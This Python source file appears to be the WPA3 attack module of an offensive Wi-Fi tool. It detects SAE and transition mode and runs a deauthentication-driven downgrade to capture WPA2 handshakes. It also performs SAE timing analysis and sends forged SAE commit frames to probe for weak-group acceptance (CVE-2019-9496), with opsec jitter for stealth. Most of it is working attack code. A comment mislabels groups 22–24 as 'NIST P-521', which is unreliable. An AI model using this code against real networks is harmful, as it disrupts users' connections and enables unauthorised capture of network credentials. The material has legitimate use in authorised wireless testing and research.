"""WPA3/SAE attack module — SAE handshake detection, Dragonblood attacks, transition mode downgrade."""

from __future__ import annotations

import contextlib
import os
import signal
import subprocess
import time
from dataclasses import dataclass, field

from rich.console import Console
from rich.table import Table

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("wpa3")


@dataclass
class Wpa3Info:
    bssid: str
    essid: str = ""
    sae_only: bool = False
    transition_mode: bool = False
    pmf_required: bool = False
    pmf_capable: bool = False
    akm_suites: list[str] = field(default_factory=list)
    group_ids: list[int] = field(default_factory=list)


@dataclass
class Wpa3AttackResult:
    success: bool
    attack_type: str
    capture_file: str | None = None
    password: str | None = None
    message: str = ""
    details: dict = field(default_factory=dict)


class Wpa3Module:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec

    def detect_wpa3(self, interface: str, bssid: str, duration: int = 30) -> Wpa3Info:
        console.print(f"[cyan]Detecting WPA3/SAE capabilities on {bssid} ({duration}s)...[/cyan]")
        self.opsec.pre_operation()
        log.info("WPA3 detection: %s on %s", bssid, interface)

        info = Wpa3Info(bssid=bssid)

        self._detect_via_scapy(interface, bssid, duration, info)

        if not info.akm_suites:
            self._detect_via_airodump(interface, bssid, duration, info)

        self._display_info(info)
        return info

    def _detect_via_scapy(self, interface: str, bssid: str, duration: int, info: Wpa3Info) -> None:
        try:
            from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff
        except ImportError:
            return

        def process_beacon(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            if pkt[Dot11].addr2 != bssid:
                return

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0 and elt.info:
                    with contextlib.suppress(Exception):
                        info.essid = elt.info.decode("utf-8", errors="ignore")
                elif elt.ID == 48 and elt.info and len(elt.info) >= 8:
                    self._parse_rsn_ie(elt.info, info)
                elt = elt.payload if hasattr(elt.payload, "ID") else None

        sniff(iface=interface, prn=process_beacon, timeout=duration, store=False,
              lfilter=lambda p: p.haslayer(Dot11Beacon))

    def _parse_rsn_ie(self, rsn_bytes: bytes, info: Wpa3Info) -> None:
        try:
            offset = 2  # version
            offset += 4  # group cipher

            pw_count = int.from_bytes(rsn_bytes[offset:offset + 2], "little")
            offset += 2 + (pw_count * 4)

            akm_count = int.from_bytes(rsn_bytes[offset:offset + 2], "little")
            offset += 2

            AKM_MAP = {
                1: "WPA2-PSK",
                2: "WPA2-EAP",
                3: "FT-PSK",
                4: "WPA2-PSK-SHA256",
                5: "WPA2-EAP-SHA256",
                6: "FT-EAP",
                8: "SAE",
                9: "FT-SAE",
                12: "EAP-SuiteB-192",
                18: "OWE",
            }

            for _i in range(akm_count):
                if offset + 4 > len(rsn_bytes):
                    break
                akm_id = rsn_bytes[offset + 3]
                akm_name = AKM_MAP.get(akm_id, f"Unknown({akm_id})")
                info.akm_suites.append(akm_name)
                offset += 4

            has_sae = any("SAE" in a for a in info.akm_suites)
            has_psk = any("PSK" in a and "SAE" not in a for a in info.akm_suites)

            if has_sae and has_psk:
                info.transition_mode = True
                info.sae_only = False
            elif has_sae:
                info.sae_only = True
                info.transition_mode = False

            if offset + 2 <= len(rsn_bytes):
                caps = int.from_bytes(rsn_bytes[offset:offset + 2], "little")
                info.pmf_capable = bool(caps & (1 << 6))
                info.pmf_required = bool(caps & (1 << 7))

        except (IndexError, ValueError):
            pass

    def _detect_via_airodump(self, interface: str, bssid: str, duration: int, info: Wpa3Info) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            prefix = os.path.join(tmpdir, "wpa3scan")
            proc = subprocess.Popen(
                ["sudo", "airodump-ng",
                 "--bssid", bssid,
                 "--write", prefix,
                 "--output-format", "csv",
                 interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(min(duration, 15))
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            csv_file = f"{prefix}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        if bssid.lower() in line.lower():
                            if "SAE" in line:
                                info.sae_only = "PSK" not in line
                                info.transition_mode = "PSK" in line
                                if "SAE" not in info.akm_suites:
                                    info.akm_suites.append("SAE")
                            parts = [p.strip() for p in line.split(",")]
                            if len(parts) > 13:
                                info.essid = ",".join(parts[13:]).strip().rstrip(",")

    def transition_downgrade(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None = None,
        output_dir: str = "./captures",
        duration: int = 120,
    ) -> Wpa3AttackResult:
        console.print(f"[cyan]WPA3 transition mode downgrade on {bssid}...[/cyan]")
        self.opsec.pre_operation()
        log.info("Transition downgrade: %s ch%d", bssid, channel)

        os.makedirs(output_dir, exist_ok=True)
        prefix = os.path.join(output_dir, f"wpa3_downgrade_{bssid.replace(':', '')}")

        dump_proc = subprocess.Popen(
            ["sudo", "airodump-ng",
             "-c", str(channel),
             "--bssid", bssid,
             "-w", prefix,
             interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)

        deauth_count = min(self.config.stealth.deauth_max_packets, 10)
        deauth_cmd = [
            "sudo", "aireplay-ng",
            "-0", str(deauth_count),
            "-a", bssid,
        ]
        if client_mac:
            deauth_cmd.extend(["-c", client_mac])
        deauth_cmd.append(interface)

        console.print(
            f"[yellow]Deauth to force reconnect ({deauth_count} frames) — "
            f"client may fall back to WPA2-PSK[/yellow]"
        )

        for _ in range(3):
            subprocess.run(deauth_cmd, capture_output=True)
            self.opsec.jitter(3.0)
            time.sleep(10)

            cap_file = f"{prefix}-01.cap"
            if os.path.exists(cap_file):
                check = subprocess.run(
                    ["aircrack-ng", cap_file],
                    capture_output=True, text=True,
                )
                if "1 handshake" in check.stdout:
                    dump_proc.send_signal(signal.SIGINT)
                    try:
                        dump_proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        dump_proc.kill()
                        dump_proc.wait()

                    console.print("[green bold]WPA2 handshake captured via downgrade![/green bold]")
                    log.info("Transition downgrade success: %s", cap_file)
                    return Wpa3AttackResult(
                        success=True,
                        attack_type="transition_downgrade",
                        capture_file=cap_file,
                        message="Client fell back to WPA2-PSK during reconnect",
                    )

        dump_proc.send_signal(signal.SIGINT)
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
            dump_proc.wait()

        return Wpa3AttackResult(
            success=False,
            attack_type="transition_downgrade",
            message="Client did not fall back to WPA2 — SAE-only reconnect or no reconnect",
        )

    def sae_timing_attack(
        self, interface: str, bssid: str, channel: int,
        duration: int = 60,
        output_dir: str = "./captures",
    ) -> Wpa3AttackResult:
        console.print(f"[cyan]SAE commit timing side-channel on {bssid}...[/cyan]")
        self.opsec.pre_operation()
        log.info("SAE timing attack: %s ch%d", bssid, channel)

        os.makedirs(output_dir, exist_ok=True)
        pcap_file = os.path.join(output_dir, f"sae_timing_{bssid.replace(':', '')}.pcap")

        try:
            from scapy.all import Dot11, Dot11Auth, sniff, wrpcap
        except ImportError:
            return Wpa3AttackResult(
                success=False,
                attack_type="sae_timing",
                message="Scapy required for SAE timing analysis",
            )

        sae_frames: list = []
        timings: list[float] = []
        last_ts = [0.0]

        def capture_sae(pkt):
            if not pkt.haslayer(Dot11Auth):
                return
            auth = pkt[Dot11Auth]
            if auth.algo != 3:  # SAE
                return
            if pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid:
                now = time.time()
                if last_ts[0] > 0:
                    delta = now - last_ts[0]
                    timings.append(delta)
                last_ts[0] = now
                sae_frames.append(pkt)

        console.print(f"[dim]Capturing SAE auth frames for {duration}s...[/dim]")
        sniff(iface=interface, prn=capture_sae, timeout=duration, store=False)

        if sae_frames:
            wrpcap(pcap_file, sae_frames)

        if len(timings) < 3:
            return Wpa3AttackResult(
                success=False,
                attack_type="sae_timing",
                capture_file=pcap_file if sae_frames else None,
                message=f"Insufficient SAE frames ({len(sae_frames)}) for timing analysis",
                details={"frame_count": len(sae_frames)},
            )

        avg_time = sum(timings) / len(timings)
        variance = sum((t - avg_time) ** 2 for t in timings) / len(timings)
        std_dev = variance ** 0.5

        timing_data = {
            "frame_count": len(sae_frames),
            "avg_response_ms": round(avg_time * 1000, 2),
            "std_dev_ms": round(std_dev * 1000, 2),
            "min_ms": round(min(timings) * 1000, 2),
            "max_ms": round(max(timings) * 1000, 2),
            "timing_samples": [round(t * 1000, 2) for t in timings],
        }

        vulnerable = std_dev > (avg_time * 0.3)

        if vulnerable:
            console.print(
                "[green bold]Timing variance detected — AP may be vulnerable to "
                "SAE side-channel (CVE-2019-9494)[/green bold]"
            )
        else:
            console.print("[yellow]Low timing variance — side-channel unlikely[/yellow]")

        log.info("SAE timing: avg=%.2fms std=%.2fms vulnerable=%s",
                 avg_time * 1000, std_dev * 1000, vulnerable)

        return Wpa3AttackResult(
            success=vulnerable,
            attack_type="sae_timing",
            capture_file=pcap_file if sae_frames else None,
            message="Timing variance suggests SAE side-channel vulnerability" if vulnerable
            else "No significant timing variance detected",
            details=timing_data,
        )

    def sae_group_downgrade(
        self, interface: str, bssid: str, channel: int,
        duration: int = 60,
    ) -> Wpa3AttackResult:
        console.print(f"[cyan]SAE group downgrade test on {bssid}...[/cyan]")
        self.opsec.pre_operation()
        log.info("SAE group downgrade: %s ch%d", bssid, channel)

        try:
            from scapy.all import Dot11, Dot11Auth, RadioTap  # noqa: F401
        except ImportError:
            return Wpa3AttackResult(
                success=False,
                attack_type="sae_group_downgrade",
                message="Scapy required",
            )

        weak_groups = [22, 23, 24]  # NIST P-521 etc., weaker than default group 19
        accepted_groups: list[int] = []

        for group_id in weak_groups:
            scalar_bytes = b"\x00" * 32
            element_bytes = b"\x00" * 64

            sae_commit = (
                RadioTap() /
                Dot11(
                    type=0, subtype=11,
                    addr1=bssid,
                    addr2="00:11:22:33:44:55",
                    addr3=bssid,
                ) /
                Dot11Auth(algo=3, seqnum=1, status=0) /
                (group_id.to_bytes(2, "little") + scalar_bytes + element_bytes)
            )

            responses = self._send_and_capture_sae(
                interface, bssid, sae_commit,
            )

            for status in responses:
                if status == 0:
                    accepted_groups.append(group_id)
                    console.print(f"[green]Group {group_id} accepted by AP[/green]")
                elif status == 77:
                    console.print(f"[dim]Group {group_id} rejected (unsupported)[/dim]")

            self.opsec.jitter(1.0)

        if accepted_groups:
            console.print(
                f"[green bold]AP accepts weak groups: {accepted_groups} — "
                f"CVE-2019-9496 may apply[/green bold]"
            )
            return Wpa3AttackResult(
                success=True,
                attack_type="sae_group_downgrade",
                message=f"AP accepts weak SAE groups: {accepted_groups}",
                details={"accepted_groups": accepted_groups},
            )

        return Wpa3AttackResult(
            success=False,
            attack_type="sae_group_downgrade",
            message="AP rejects all tested weak groups — properly configured",
        )

    @staticmethod
    def _send_and_capture_sae(interface: str, bssid: str, sae_commit) -> list[int]:
        from scapy.all import Dot11, Dot11Auth, sendp, sniff

        responses: list[int] = []

        def check_response(pkt):
            if pkt.haslayer(Dot11Auth):
                auth = pkt[Dot11Auth]
                if auth.algo == 3 and pkt[Dot11].addr2 == bssid:
                    responses.append(auth.status)

        sendp(sae_commit, iface=interface, verbose=False)
        sniff(iface=interface, prn=check_response, timeout=3, store=False)
        return responses

    def _display_info(self, info: Wpa3Info) -> None:
        table = Table(title=f"WPA3 Info: {info.bssid}")
        table.add_column("Property", style="cyan")
        table.add_column("Value")

        table.add_row("ESSID", info.essid or "[hidden]")
        table.add_row("SAE Only", "[red]Yes[/red]" if info.sae_only else "[green]No[/green]")
        table.add_row(
            "Transition Mode",
            "[yellow]Yes (WPA2+WPA3)[/yellow]" if info.transition_mode else "No",
        )
        table.add_row("PMF Required", "[red]Yes[/red]" if info.pmf_required else "No")
        table.add_row("PMF Capable", "Yes" if info.pmf_capable else "No")
        table.add_row("AKM Suites", ", ".join(info.akm_suites) or "Unknown")

        console.print(table)

        if info.transition_mode:
            console.print(
                "\n[yellow bold]TRANSITION MODE — downgrade attack possible![/yellow bold]"
            )
            console.print("[dim]Use: voidfreq wpa3 downgrade -t <BSSID> -ch <CH>[/dim]")
        elif info.sae_only:
            console.print(
                "\n[red bold]SAE-ONLY — standard WPA2 attacks will not work[/red bold]"
            )
            console.print("[dim]Try: timing analysis or group downgrade[/dim]")

    def to_dict(self, info: Wpa3Info) -> dict:
        return {
            "bssid": info.bssid,
            "essid": info.essid,
            "sae_only": info.sae_only,
            "transition_mode": info.transition_mode,
            "pmf_required": info.pmf_required,
            "pmf_capable": info.pmf_capable,
            "akm_suites": info.akm_suites,
        }
